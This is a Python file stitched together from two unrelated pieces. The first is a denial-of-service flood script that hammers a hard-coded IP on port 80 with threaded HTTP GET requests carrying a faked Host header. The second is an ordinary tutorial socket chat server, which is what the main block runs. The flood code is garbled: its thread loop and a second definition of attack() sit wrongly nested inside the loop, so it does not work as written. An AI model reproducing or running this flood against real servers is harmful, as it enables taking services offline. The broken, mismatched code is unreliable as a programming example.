import socket
import threading

target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80

def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            for i in range(500):
                thread = threading.Thread(target=attack)
                thread.start()


                attack_num = 0

                def attack():
                    while True:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target, port))
                        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                                                            
                        global attack_num
                        attack_num += 1
                        print(attack_num)
                                                                                            
                        s.close()

def server_program():
    # get the hostname
    host = socket.gethostname()
    port = 5000  # initiate port no above 1024

    server_socket = socket.socket()  # get instance
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(2)
    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024).decode()
        if not data:
            # if data is not received break
            break
        print("from connected user: " + str(data))
        data = input(' -> ')
        conn.send(data.encode())  # send data to the client

    conn.close()  # close the connection


if __name__ == '__main__':
    server_program()